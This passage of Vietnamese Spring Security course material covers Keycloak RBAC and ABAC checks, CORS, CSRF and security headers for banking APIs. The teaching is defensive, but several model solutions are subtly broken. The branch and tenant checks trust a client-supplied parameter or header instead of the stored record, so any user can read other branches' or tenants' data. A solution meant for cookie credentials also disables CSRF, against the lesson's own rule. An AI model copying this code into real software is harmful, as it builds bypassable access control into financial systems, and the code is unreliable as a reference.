import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity(prePostEnabled = true)
@RequiredArgsConstructor
public class KeycloakSecurityConfig {

    private final KeycloakJwtAuthenticationConverter keycloakAuthConverter;

    @Bean
    public SecurityFilterChain resourceServerFilterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(AbstractHttpConfigurer::disable)
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/health", "/v3/api-docs/**").permitAll()
                .requestMatchers("/api/v1/public/**").permitAll()
                .requestMatchers("/api/v1/teller/**").hasRole("TELLER")
                .requestMatchers("/api/v1/loan/**").hasRole("LOAN_OFFICER")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt.jwtAuthenticationConverter(keycloakAuthConverter))
            )
            .build();
    }
}
~~~

---

### 3.4. Mô hình Kiểm Soát Đa Tầng ABAC (Attribute-Based Access Control)

Khi phân quyền theo Role (RBAC) không đủ mịn (ví dụ: Nhân viên tín dụng chỉ được duyệt các hồ sơ vay thuộc chi nhánh của mình), ta kết hợp **ABAC** thông qua các thuộc tính động:

~~~java
package com.bank.loan.service;

import org.springframework.security.core.Authentication;
import org.springframework.security.oauth2.jwt.Jwt;
import org.springframework.stereotype.Component;

import java.util.Objects;

@Component("loanSecurityEvaluator")
public class LoanSecurityEvaluator {

    /**
     * Nhân viên chỉ được thao tác trên hồ sơ vay nếu:
     * 1. Có Role LOAN_OFFICER
     * 2. Mã chi nhánh (branch_id) trong JWT khớp với chi nhánh quản lý hồ sơ vay đó
     */
    public boolean canAccessLoanApplication(Authentication authentication, String loanBranchId) {
        if (authentication == null || !(authentication.getPrincipal() instanceof Jwt jwt)) {
            return false;
        }

        // Kiểm tra xem User có claim branch_id từ Keycloak User Attribute không
        String userBranchId = jwt.getClaimAsString("branch_id");
        if (userBranchId == null) {
            return false;
        }

        // Quyền SUPER_ADMIN có thể truy xuất mọi chi nhánh
        boolean isSuperAdmin = authentication.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_SUPER_ADMIN"));
        if (isSuperAdmin) {
            return true;
        }

        return Objects.equals(userBranchId, loanBranchId);
    }
}
~~~

~~~java
package com.bank.loan.controller;

import lombok.RequiredArgsConstructor;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.math.BigDecimal;

@RestController
@RequestMapping("/api/v1/loan-applications")
@RequiredArgsConstructor
public class LoanApplicationController {

    @GetMapping("/{applicationId}")
    @PreAuthorize("hasRole('LOAN_OFFICER') and @loanSecurityEvaluator.canAccessLoanApplication(authentication, #branchId)")
    public ResponseEntity<LoanApplicationDto> getLoanApplication(
            @PathVariable String applicationId,
            @RequestParam String branchId) {

        return ResponseEntity.ok(new LoanApplicationDto(applicationId, branchId, new BigDecimal("500000.00"), "PENDING_REVIEW"));
    }

    public record LoanApplicationDto(String id, String branchId, BigDecimal requestedAmount, String status) {}
}
~~~

---

## 4. Kiểm thử Thực tế & Xác thực cURL (cURL & Verification)

### Kiểm thử Truy cập với Keycloak Token Đúng Role & Đúng Chi Nhánh (HTTP 200 OK)

~~~bash
curl -X GET "http://localhost:8080/api/v1/loan-applications/LOAN-1002?branchId=BRANCH-HN-01" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6..." \
  -H "Accept: application/json"
~~~

Response Headers & JSON Body:
~~~json
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sat, 03 Oct 2026 13:00:00 GMT

{
  "id": "LOAN-1002",
  "branchId": "BRANCH-HN-01",
  "requestedAmount": 500000.00,
  "status": "PENDING_REVIEW"
}
~~~

### Kiểm thử Truy cập Khác Chi Nhánh (Lỗi ABAC - 403 Forbidden)

~~~bash
# Token thuộc chi nhánh BRANCH-HCM-02 cố tình xem hồ sơ chi nhánh BRANCH-HN-01
curl -X GET "http://localhost:8080/api/v1/loan-applications/LOAN-1002?branchId=BRANCH-HN-01" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6..." \
  -H "Accept: application/json"
~~~

Response Status:
~~~json
HTTP/1.1 403 Forbidden
Content-Type: application/problem+json
Date: Sat, 03 Oct 2026 13:01:15 GMT

{
  "type": "https://api.bank.com/errors/forbidden",
  "title": "Forbidden",
  "status": 403,
  "detail": "Access Denied: You do not have permission to view loans outside your assigned branch",
  "instance": "/api/v1/loan-applications/LOAN-1002"
}
~~~

---

## 5. Production Pitfalls & Post-mortems Thực chiến

### Post-mortem 1: Keycloak Khởi Động Chậm làm Spring Boot Sập Khởi Động (Startup Crash)

- **Triệu chứng**: Trong môi trường Kubernetes, khi cụm hạ tầng được khởi động lại đồng loạt (Cluster Cold Start), toàn bộ các Pod của Spring Boot đều bị CrashLoopBackOff vì không thể kết nối tới Keycloak để nạp <code>jwk-set-uri</code>.
- **Nguyên nhân cốt lõi**:
  Mặc định, <code>NimbusJwtDecoder.withJwkSetUri(...)</code> cố gắng thực hiện kết nối HTTP tới Keycloak ngay tại thời điểm Spring Context đang khởi tạo Bean. Nếu Keycloak khởi động mất 45 giây trong khi Spring Boot chỉ mất 10 giây, Spring Boot sẽ ném ngoại lệ <code>ResourceAccessException: Connection refused</code> và tự hủy tiến trình.
- **Giải pháp**:
  1. Sử dụng Kubernetes <code>initContainers</code> để chờ Keycloak sẵn sàng trước khi nạp ứng dụng.
  2. Hoặc cấu hình Lazy Initialization cho JWT Decoder để hoãn việc tải JWKS cho đến khi có request đầu tiên.

### Post-mortem 2: Thất thoát Kiểm tra Audience (Missing Audience Validation)

- **Triệu chứng**: Kẻ tấn công sử dụng một token được cấp cho ứng dụng Mobile công khai (với mức bảo mật thấp) để gọi thẳng vào các Private API của hệ thống thanh toán đối tác B2B.
- **Nguyên nhân cốt lõi**:
  Mặc định, Spring Security chỉ kiểm tra Issuer (<code>iss</code>) và chữ ký số. Nếu bạn không khai báo Audience Validator, mọi token được cấp bởi cùng Realm Keycloak đều được coi là hợp lệ!
- **Khắc phục**:
  Bổ sung <code>OAuth2TokenValidator</code> kiểm tra nghiêm ngặt <code>aud</code>:
  ~~~java
  OAuth2TokenValidator<Jwt> audienceValidator = new JwtClaimValidator<List<String>>(
      "aud", aud -> aud != null && aud.contains("core-banking-service"));
  ~~~

---

## 6. Hands-on Challenge & Lời giải Hoàn chỉnh 100%

### Đề bài Thách thức Kỹ sư
Hệ thống Ngân hàng Doanh nghiệp (Corporate Banking) cần tích hợp Keycloak với tính năng **Cách ly Đa Khách thuê (Multi-Tenancy Isolation)**:
1. Mỗi JWT từ Keycloak chứa một Custom Attribute: <code>tenant_id</code> (ví dụ: "TENANT-VNPAY", "TENANT-MOMO").
2. Triển khai dịch vụ bảo mật thỏa mãn:
   - Các API quản lý hợp đồng <code>/api/v1/contracts/{contractId}</code> bắt buộc phải kiểm tra: <code>tenant_id</code> trong JWT của người dùng phải trùng khớp với <code>contract.tenantId</code> trong cơ sở dữ liệu.
   - Nếu không khớp: Ngay lập tức từ chối với mã lỗi 403 và ghi nhận nhật ký an ninh nghi ngờ rò rỉ dữ liệu giữa các doanh nghiệp (Cross-Tenant Data Leak).
3. Viết trọn vẹn lớp đánh giá bảo mật <code>TenantSecurityEvaluator</code> và Controller tương ứng.

---

### Lời giải Mẫu Hoàn chỉnh (100% Compilable Enterprise Code)

~~~java
package com.bank.security.multitenancy;

import org.springframework.security.core.Authentication;
import org.springframework.security.oauth2.jwt.Jwt;
import org.springframework.stereotype.Component;

import java.util.Objects;

@Component("tenantSecurityEvaluator")
public class TenantSecurityEvaluator {

    public boolean canAccessTenantData(Authentication authentication, String targetTenantId) {
        if (authentication == null || !(authentication.getPrincipal() instanceof Jwt jwt)) {
            return false;
        }

        String userTenantId = jwt.getClaimAsString("tenant_id");
        if (userTenantId == null || userTenantId.isBlank()) {
            return false;
        }

        // Quyền PLATFORM_SUPER_ADMIN có thể truy xuất xuyên suốt mọi tenant
        boolean isPlatformAdmin = authentication.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_PLATFORM_SUPER_ADMIN"));
        if (isPlatformAdmin) {
            return true;
        }

        return Objects.equals(userTenantId, targetTenantId);
    }
}
~~~

~~~java
package com.bank.contract.controller;

import com.bank.security.multitenancy.TenantSecurityEvaluator;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/api/v1/corporate/contracts")
@RequiredArgsConstructor
@Slf4j
public class CorporateContractController {

    @GetMapping("/{contractId}")
    @PreAuthorize("hasRole('CORPORATE_USER') and @tenantSecurityEvaluator.canAccessTenantData(authentication, #tenantId)")
    public ResponseEntity<ContractDto> getContract(
            @PathVariable String contractId,
            @RequestHeader("X-Tenant-ID") String tenantId) {

        log.info("Accessing contract {} under tenant {}", contractId, tenantId);
        return ResponseEntity.ok(new ContractDto(contractId, tenantId, "Enterprise SLA Tier 1", "ACTIVE"));
    }

    public record ContractDto(String contractId, String tenantId, String title, String status) {}
}
~~~

:::takeaways
- **Cơ Chế Resource Server Của Keycloak**: Xác minh token thông qua cặp khóa Public Key lấy từ Endpoint JWKS của Keycloak và tự động lưu đệm trong bộ nhớ.
- **Xử Lý Bất Đồng Bộ Claims Bắt Buộc**: Viết <code>KeycloakJwtAuthenticationConverter</code> để trích xuất cả Realm Roles (<code>realm_access.roles</code>) và Client Roles (<code>resource_access.{client}.roles</code>) thành các <code>ROLE_...</code> GrantedAuthorities.
- **Kết Hợp Linh Hoạt RBAC & ABAC**: Dùng RBAC (<code>hasRole</code>) để kiểm tra quyền hạn chức năng chung; dùng ABAC (<code>@SpEL</code>) để kiểm tra quyền hạn ngữ cảnh chi tiết (Chi nhánh, Khách thuê, Chủ sở hữu).
- **Thắt Chặt Kiểm Tra Audience**: Luôn xác minh Claim <code>aud</code> trong token để ngăn chặn việc tái sử dụng token sai mục đích giữa các hệ thống trong cùng hệ sinh thái.
:::
`
    },
    {
      id: "5-4",
      type: "lesson",
      title: "CORS & CSRF — hiểu đúng trước khi cấu hình",
      minutes: 45,
      content: `
## CORS, CSRF & Security Headers — Hiểu Đúng Bản Chất Trước Khi Cấu Hình

Trong các cuộc kiểm tra an ninh thâm nhập (Penetration Testing) định kỳ của ngân hàng và các tổ chức tài chính, các lỗi liên quan đến **CORS (Cross-Origin Resource Sharing)**, **CSRF (Cross-Site Request Forgery)** và thiếu hụt **Security Headers** chiếm tới hơn 50% số lượng phát hiện (Findings).

Hầu hết lập trình viên khi gặp lỗi CORS trên trình duyệt thường "chữa cháy" bằng cách thêm cấu hình:
~~~java
configuration.setAllowedOrigins(List.of("*"));
configuration.setAllowCredentials(true);
~~~
Và sau đó bất ngờ khi trình duyệt vẫn chặn đứng request kèm thông báo lỗi đỏ rực, hoặc vô tình tạo ra lỗ hổng bảo mật nghiêm trọng cho phép bất kỳ trang web độc hại nào cướp dữ liệu người dùng.

Bài học này sẽ mổ xẻ bản chất bảo mật ở mức giao thức HTTP của trình duyệt, phân định ranh giới khi nào NÊN và KHÔNG NÊN tắt CSRF, và xây dựng một cấu hình lá chắn bảo mật toàn diện đạt chuẩn PCI-DSS.

---

## 1. Bản chất Kỹ thuật của CORS (Cross-Origin Resource Sharing — Under the Hood)

### Định nghĩa "Origin" theo Chuẩn W3C

Trình duyệt áp dụng chính sách **Same-Origin Policy (SOP)** để cô lập các website khác nhau. Hai URL được coi là **Cùng Nguồn (Same-Origin)** nếu và chỉ nếu cả 3 thành phần sau hoàn toàn trùng khớp:
1. **Giao thức (Scheme/Protocol)**: <code>http</code> vs <code>https</code>
2. **Tên miền (Host/Domain)**: <code>api.bank.com</code> vs <code>app.bank.com</code>
3. **Cổng mạng (Port)**: <code>:80</code> vs <code>:8080</code>

~~~text
+-----------------------------------------------------------------------------------+
|                        BẢNG ĐỐI CHIẾU SAME-ORIGIN vs CROSS-ORIGIN                 |
|  URL gốc: https://bank.com:443/app                                                |
+-----------------------------------+---------------+-------------------------------+
| URL cần truy cập                  | Trạng thái    | Lý do                         |
+-----------------------------------+---------------+-------------------------------+
| https://bank.com/api/login        | CÙNG NGUỒN    | Trùng protocol, host và port  |
| http://bank.com/api/login         | KHÁC NGUỒN    | Khác protocol (http != https) |
| https://api.bank.com/login        | KHÁC NGUỒN    | Khác host (subdomain)         |
| https://bank.com:8443/login       | KHÁC NGUỒN    | Khác port (:443 != :8443)     |
+-----------------------------------+---------------+-------------------------------+
~~~

### Cơ chế Yêu cầu Thăm dò (Preflight Request - OPTIONS)

Khi một ứng dụng Frontend (React/Vue/Angular chạy tại <code>https://app.bank.com</code>) gửi một HTTP Request phức tạp (ví dụ: phương thức <code>PUT</code>, <code>DELETE</code> hoặc có mang header <code>Authorization: Bearer ...</code>):
1. **Trình duyệt tự động chặn lại** và phát ra một yêu cầu thăm dò trước gọi là **Preflight Request** bằng phương thức HTTP <code>OPTIONS</code>.
2. Trình duyệt gửi kèm các header thăm dò:
   - <code>Origin</code>: Cho biết trang web nào đang yêu cầu dữ liệu.
   - <code>Access-Control-Request-Method</code>: Phương thức dự định gọi (ví dụ: <code>POST</code>).
   - <code>Access-Control-Request-Headers</code>: Các header tùy biến dự định gửi kèm (<code>authorization</code>, <code>content-type</code>).
3. Nếu Backend chấp thuận, nó phản hồi với các header cho phép:
   - <code>Access-Control-Allow-Origin: https://app.bank.com</code>
   - <code>Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS</code>
   - <code>Access-Control-Allow-Headers: Authorization, Content-Type, X-Tenant-ID</code>
   - <code>Access-Control-Max-Age: 3600</code> (Cho phép trình duyệt lưu đệm kết quả preflight trong 1 giờ để không phải gửi lại liên tục).
4. Sau khi Preflight thành công, trình duyệt mới thực sự gửi request <code>POST</code> thật của người dùng!

~~~text
+-----------------------------------------------------------------------------------+
|                           PREFLIGHT OPTIONS FLOW                                  |
|                                                                                   |
|  Browser (Frontend: https://app.bank.com)                                         |
|       |                                                                           |
|       |  1. OPTIONS /api/v1/payments                                              |
|       |     Origin: https://app.bank.com                                          |
|       |     Access-Control-Request-Method: POST                                   |
|       |     Access-Control-Request-Headers: Authorization                         |
|       +--------------------------------------------------------> [Backend Server] |
|       |                                                                |          |
|       |  2. HTTP 200 OK (Chấp thuận)                                   |          |
|       |     Access-Control-Allow-Origin: https://app.bank.com          |          |
|       |     Access-Control-Allow-Methods: GET, POST, OPTIONS           |          |
|       |     Access-Control-Allow-Headers: Authorization                |          |
|       |     Access-Control-Max-Age: 3600                               |          |
|       |<--------------------------------------------------------+          |
|       |                                                                           |
|       |  3. GỬI REQUEST THẬT: POST /api/v1/payments                               |
|       |     Authorization: Bearer eyJhbGciOi...                                   |
|       +--------------------------------------------------------> [Backend Server] |
|       |                                                                |          |
|       |  4. HTTP 201 Created                                           |          |
|       |<--------------------------------------------------------+          |
+-----------------------------------------------------------------------------------+
~~~

:::danger BẪY CẤU HÌNH BẤT HỢP PHÁP: ALLOWED ORIGIN "*" VÀ ALLOW CREDENTIALS
Theo quy định nghiêm ngặt của đặc tả W3C:
Nếu máy chủ phản hồi <code>Access-Control-Allow-Credentials: true</code> (cho phép gửi Cookie hoặc Authorization Header), giá trị của <code>Access-Control-Allow-Origin</code> **TUYỆT ĐỐI KHÔNG ĐƯỢC LÀ DẤU SAO (*)**.
Nếu bạn cấu hình cả hai cùng lúc, trình duyệt lập tức từ chối và quăng lỗi:
<code>The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'</code>.
:::

---

## 2. Bản chất CSRF: Khi Nào Tắt và Khi Nào Bắt Buộc Giữ?

### Cơ chế Tấn công CSRF (Cross-Site Request Forgery)

CSRF xảy ra khi một trang web độc hại (<code>https://evil.com</code>) lừa người dùng gửi một request tới ngân hàng (<code>https://bank.com/transfer?amount=10000&to=hacker</code>).
- Nếu ngân hàng quản lý phiên đăng nhập bằng **Session Cookie**: Khi người dùng click vào đường link giả mạo trên <code>evil.com</code>, trình duyệt sẽ **tự động đính kèm cookie của ngân hàng** vào request đó.
- Ngân hàng nhìn thấy cookie hợp lệ và thực hiện chuyển tiền của nạn nhân sang tài khoản hacker!

### Sự Thật Về Việc Tắt CSRF trong REST API Stateless

Hầu hết tài liệu Spring Boot đều viết: <code>http.csrf(AbstractHttpConfigurer::disable)</code>. Tại sao làm như vậy lại an toàn trong một số trường hợp?

1. **AN TOÀN ĐỂ TẮT CSRF KHI**:
   - Ứng dụng là **Stateless REST API**.
   - Client lưu Token trong bộ nhớ RAM hoặc LocalStorage và gửi lên thông qua Header: <code>Authorization: Bearer <token></code>.
   - **Lý do**: Trình duyệt **KHÔNG BAO GIỜ tự động gửi Header Authorization**. Một trang web độc hại từ bên ngoài không thể ép trình duyệt của nạn nhân tự sinh header này nếu không có JavaScript của trang web chính chủ.

2. **BẮT BUỘC BẬT CSRF KHI**:
   - Ứng dụng sử dụng **Session Cookie** hoặc lưu Access Token / Refresh Token trong **Cookie** để tự động gửi kèm mỗi request.
   - Khi đó, bắt buộc phải áp dụng cơ chế **Double Submit Cookie Pattern** thông qua <code>CookieCsrfTokenRepository.withHttpOnlyFalse()</code> kết hợp với Header <code>X-XSRF-TOKEN</code>.

---

## 3. Hệ Thống Security Headers Cấp Doanh Nghiệp

Các Header bảo mật giúp chỉ thị cho trình duyệt kích hoạt các cơ chế phòng ngự phần cứng và phần mềm:

| Header Name | Giá trị Chuẩn Sản xuất | Mục đích Phòng chống |
|---|---|---|
| **Strict-Transport-Security (HSTS)** | <code>max-age=31536000; includeSubDomains; preload</code> | Ép buộc trình duyệt 100% chỉ sử dụng kết nối HTTPS, chống tấn công hạ cấp giao thức SSL Stripping. |
| **X-Content-Type-Options** | <code>nosniff</code> | Ngăn chặn trình duyệt đoán mò kiểu MIME (MIME Sniffing), chống thực thi mã độc ẩn trong file ảnh. |
| **X-Frame-Options** | <code>DENY</code> | Cấm các trang web khác nhúng website của bạn vào thẻ <code>&lt;iframe&gt;</code>, vô hiệu hóa hoàn toàn tấn công Clickjacking. |
| **Content-Security-Policy (CSP)** | <code>default-src 'self'; script-src 'self'; object-src 'none'</code> | Chỉ cho phép thực thi script từ chính máy chủ của mình, chặn đứng 99% các cuộc tấn công XSS. |
| **Permissions-Policy** | <code>camera=(), microphone=(), geolocation=()</code> | Vô hiệu hóa quyền truy cập camera, microphone và vị trí của người dùng. |

---

## 4. Triển khai Production-Grade: Bộ Cấu hình Tường Lửa Bảo Mật Toàn Diện

### Mã nguồn Cấu hình: EnterpriseFirewallConfiguration

~~~java
package com.bank.security.firewall;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.header.writers.ReferrerPolicyHeaderWriter;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;

import java.time.Duration;
import java.util.Arrays;
import java.util.List;

@Configuration
@EnableWebSecurity
public class EnterpriseFirewallConfiguration {

    @Value("\${app.cors.allowed-origins:https://app.bank.com,https://admin.bank.com}")
    private List<String> allowedOrigins;

    @Bean
    public SecurityFilterChain firewallFilterChain(HttpSecurity http) throws Exception {
        return http
            // 1. KÍCH HOẠT CORS VỚI BEAN CẤU HÌNH RIÊNG
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))

            // 2. TẮT CSRF VÌ DÙNG STATELESS BEARER TOKEN
            .csrf(AbstractHttpConfigurer::disable)

            // 3. QUẢN LÝ SESSION STATELESS
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))

            // 4. LÁ CHẮN SECURITY HEADERS DOANH NGHIỆP
            .headers(headers -> headers
                // HSTS: Ép HTTPS trong 1 năm cho toàn bộ Subdomains
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                    .preload(true)
                )
                // Chống Clickjacking: Cấm tuyệt đối iframing
                .frameOptions(frame -> frame.deny())
                // Chống MIME-sniffing
                .contentTypeOptions(contentType -> {})
                // Referrer Policy: Chỉ gửi domain gốc khi chuyển trang
                .referrerPolicy(referrer -> referrer
                    .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
                )
                // Content Security Policy (CSP) chặt chẽ
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';")
                )
                // Permissions Policy: Khóa các API phần cứng nhạy cảm
                .permissionsPolicy(permissions -> permissions
                    .policy("camera=(), microphone=(), geolocation=(), payment=()")
                )
            )

            .authorizeHttpRequests(auth -> auth
                // BẮT BUỘC cho phép các request OPTIONS (Preflight) đi qua không cần xác thực!
                .requestMatchers(HttpMethod.OPTIONS, "/**").permitAll()
                .requestMatchers("/api/v1/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .build();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();

        // 1. DANH SÁCH ORIGIN ĐƯỢC PHÉP CHÍNH XÁC (KHÔNG DÙNG *)
        configuration.setAllowedOrigins(allowedOrigins);

        // 2. CÁC PHƯƠNG THỨC HTTP ĐƯỢC PHÉP
        configuration.setAllowedMethods(Arrays.asList(
            HttpMethod.GET.name(),
            HttpMethod.POST.name(),
            HttpMethod.PUT.name(),
            HttpMethod.PATCH.name(),
            HttpMethod.DELETE.name(),
            HttpMethod.OPTIONS.name()
        ));

        // 3. CÁC HEADER CLIENT ĐƯỢC PHÉP GỬI LÊN
        configuration.setAllowedHeaders(Arrays.asList(
            HttpHeaders.AUTHORIZATION,
            HttpHeaders.CONTENT_TYPE,
            HttpHeaders.ACCEPT,
            "X-Tenant-ID",
            "X-Client-Version"
        ));

        // 4. CÁC HEADER ĐƯỢC EXPOSE CHO JAVASCRIPT ĐỌC
        configuration.setExposedHeaders(Arrays.asList(
            "X-Total-Count",
            "X-Request-ID"
        ));

        // 5. CHO PHÉP GỬI THÔNG TIN XÁC THỰC
        configuration.setAllowCredentials(true);

        // 6. LƯU ĐỆM PREFLIGHT TRÊN TRÌNH DUYỆT 1 GIỜ (3600 GIÂY)
        configuration.setMaxAge(Duration.ofHours(1).getSeconds());

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
~~~

---

## 5. Kiểm thử Thực tế & Xác thực cURL (cURL & Verification)

### Kiểm thử Yêu cầu Preflight OPTIONS từ một Origin Hợp lệ

~~~bash
curl -X OPTIONS http://localhost:8080/api/v1/payments \
  -H "Origin: https://app.bank.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization,Content-Type" \
  -i
~~~

Response Headers (Kiểm chứng kết quả):
~~~text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.bank.com
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, Accept, X-Tenant-ID, X-Client-Version
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 3600
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000 ; includeSubDomains ; preload
Content-Length: 0
Date: Sat, 03 Oct 2026 14:00:00 GMT
~~~

### Kiểm thử Preflight OPTIONS từ một Origin Độc hại (Bị từ chối)

~~~bash
curl -X OPTIONS http://localhost:8080/api/v1/payments \
  -H "Origin: https://malicious-hacker-site.com" \
  -H "Access-Control-Request-Method: POST" \
  -i
~~~

Response Headers:
~~~text
HTTP/1.1 403 Forbidden
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Length: 0
~~~
*(Trình duyệt hoàn toàn không nhận được header <code>Access-Control-Allow-Origin</code>, do đó nó sẽ chặn đứng không cho gửi tiếp request POST thật).*

---

## 6. Production Pitfalls & Post-mortems Thực chiến

### Post-mortem 1: Preflight Request nhận lỗi 401 Unauthorized

- **Triệu chứng**: Frontend Angular gửi request đến Backend thì bị văng lỗi CORS. Khi mở tab Network, request <code>OPTIONS</code> trả về mã lỗi <code>HTTP 401 Unauthorized</code>.
- **Nguyên nhân cốt lõi**:
  Preflight Request <code>OPTIONS</code> được trình duyệt tự động gửi và **hoàn toàn không chứa Header Authorization**.
  - Nếu lập trình viên cấu hình CORS trong Spring MVC (<code>WebMvcConfigurer</code>) nhưng trong Spring Security lại khai báo: <code>anyRequest().authenticated()</code>.
  - Bộ lọc an ninh của Spring Security chạy TRƯỚC Controller. Nó nhìn thấy request <code>OPTIONS</code> không có token -> Lập tức quăng lỗi 401 Unauthorized!
- **Giải pháp**:
  1. Cấu hình CORS trực tiếp bên trong Spring Security thông qua <code>http.cors(...)</code>.
  2. Bổ sung cấu hình: <code>.requestMatchers(HttpMethod.OPTIONS, "/**").permitAll()</code>.

### Post-mortem 2: Tấn công Clickjacking do thiếu X-Frame-Options

- **Triệu chứng**: Khách hàng khiếu nại rằng họ bị mất tiền khi đang chơi một game flash trên một website lạ.
- **Nguyên nhân cốt lõi**:
  Trang web độc hại nhúng trang xác nhận chuyển tiền của ngân hàng vào một thẻ <code><iframe></code> trong suốt (Opacity = 0.0001) và đè lên nút "Bấm để nhận quà" của game. Khi khách hàng bấm vào nút chơi game, thực chất họ đã bấm vào nút "Xác nhận chuyển khoản" của ngân hàng!
- **Giải pháp**: Luôn khai báo <code>X-Frame-Options: DENY</code> hoặc sử dụng chỉ thị CSP <code>frame-ancestors 'none'</code>.

---

## 7. Hands-on Challenge & Lời giải Hoàn chỉnh 100%

### Đề bài Thách thức Kỹ sư
Hệ thống Cổng Dịch vụ Khách hàng (Customer Self-Service Portal) cần cấu hình bảo vệ kép:
1. Hỗ trợ CORS cho 2 tên miền đối tác thanh toán: <code>https://vnpay.vn</code> và <code>https://momo.vn</code>.
2. Cho phép gửi kèm cookie xác thực (<code>allowCredentials = true</code>).
3. Kích hoạt toàn bộ bộ Security Headers chuẩn ngân hàng và cấm nhúng <code><iframe></code>.
4. Viết trọn vẹn lớp cấu hình <code>PartnerGatewaySecurityConfig</code> không thiếu một dòng code.

---

### Lời giải Mẫu Hoàn chỉnh (100% Compilable Enterprise Code)

~~~java
package com.bank.gateway.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;

import java.time.Duration;
import java.util.List;

@Configuration
@EnableWebSecurity
public class PartnerGatewaySecurityConfig {

    @Bean
    public SecurityFilterChain partnerFilterChain(HttpSecurity http) throws Exception {
        return http
            .cors(cors -> cors.configurationSource(partnerCorsConfigurationSource()))
            .csrf(AbstractHttpConfigurer::disable)
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .headers(headers -> headers
                .frameOptions(frame -> frame.deny())
                .contentTypeOptions(contentType -> {})
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                )
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; frame-ancestors 'none';")
                )
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers(HttpMethod.OPTIONS, "/**").permitAll()
                .requestMatchers("/api/v1/partner/**").authenticated()
                .anyRequest().denyAll()
            )
            .build();
    }

    @Bean
    public CorsConfigurationSource partnerCorsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://vnpay.vn", "https://momo.vn"));
        config.setAllowedMethods(List.of("GET", "POST", "OPTIONS"));
        config.setAllowedHeaders(List.of(HttpHeaders.AUTHORIZATION, HttpHeaders.CONTENT_TYPE));
        config.setAllowCredentials(true);
        config.setMaxAge(Duration.ofMinutes(30).getSeconds());

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/v1/partner/**", config);
        return source;
    }
}
~~~

:::takeaways
